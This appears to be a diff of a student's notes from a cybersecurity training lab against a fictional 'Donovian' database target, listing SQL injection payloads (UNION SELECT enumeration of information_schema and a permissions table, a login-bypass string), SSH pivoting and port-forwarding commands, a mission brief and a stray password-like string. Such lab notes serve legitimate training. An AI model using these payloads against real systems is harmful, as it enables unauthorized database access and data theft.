@@ -180,13 +180,98 @@ GET METHOD (URL MANIPULATION)
 
 
 
+UNION SELECT table_schema,permission_level,null FROM users WHERE permission_level='banned' #
+
+
+
+
+
+10.100.28.40
+80 // 4444
+/home/student/.ssh/id_rsa.pub
+
+
+EkXBJpSgYSJm
+
+how to connect to web exploitation
+ssh -MS /tmp/jmp student@10.50.16.1
+ssh -S /tmp/jmp student@10.50.16.1
+ssh -S /tmp/jmp jmp -O forward -L 50000:10.100.28.40:80
+ssh -S /tmp/jmp jmp -O forward -L 51000:10.100.28.40:4444
+ssh -S tmp/jmp -i /home/student/.ssh/id_rsa.pub billybob@127.0.0.1 -p 51000
+
+ssh -MS /tmp/jmp student@pivot
+ssh -S /tmp/jmp student@pivot
+ssh -S /tmp/jmp jmp -O forward -L 50000:target:80
+ssh -S /tmp/jmp jmp -O forward -L 51000:target:4444
+ssh -S tmp/jmp -i /home/student/.ssh/id_rsa.pub billybob@127.0.0.1 -p 51000
+
+
+how to check for vulnverable input field:
+Audi 'OR 1='1
+Audi 'Union select 1,2,3,4,5 #
 
 
 
 
 
 
+day 4 stuff
+Donovian Database Exploitation (DWDBE)
+XX Dec 2026
+Start Time: 1300
+Duration: 4 hours
 
+Type of Operation: Cyberspace Exploitation (C-E)
+
+Objective: Maneuver through network, identify and gather intelligence from the Donovian Logistics Agency database.
+
+Tools/Techniques:
+All connections will be established through web browser to donovian-nla.
+SSH masquerade to Donovian_Webserver with provide credentials.
+Ports in use will be dependent on target location and are subject to change.
+Web exploitation techniques are limited to SQLi injections. Network scanning tools/technique usage is at the discretion of student.
+
+
+Prior Approvals:
+SQLi injects through web browser.
+Creation of database administrator account if directed to.
+Any connection to donovian-nla other than HTTP/HTTPs is NOT approved.
+
+Scheme of Maneuver:
+>Jump Box
+->T1:10.100.28.48
+
+Target Section:
+
+T1
+Hostname: donovian-nla
+IP: 10.100.28.48
+OS: unknown
+Creds:unknown
+Last Known SSH Port: unknown
+Last Known HTTP Port: 80
+PSP: Unknown
+Malware: Unknown
+Action: Conduct approved SQLi Exploitation techniques to collect intelligence.
+
+
+
+
+
+check: ram' or 1='1
+3 columns are required to make a UNION SELECT on the categories page
+
+UNION SELECT 1,2,3 #
+
+
+UNION SELECT table_schema,table_name,column_name FROM information_schema.columns; #
+UNION SELECT name,description,level FROM sqlinjection.permissions; #
+
+UNION SELECT name,description,level FROM sqlinjection.permissions; #
+
+login bypass:
+' OR 1=1 OR ''='
 
 
 
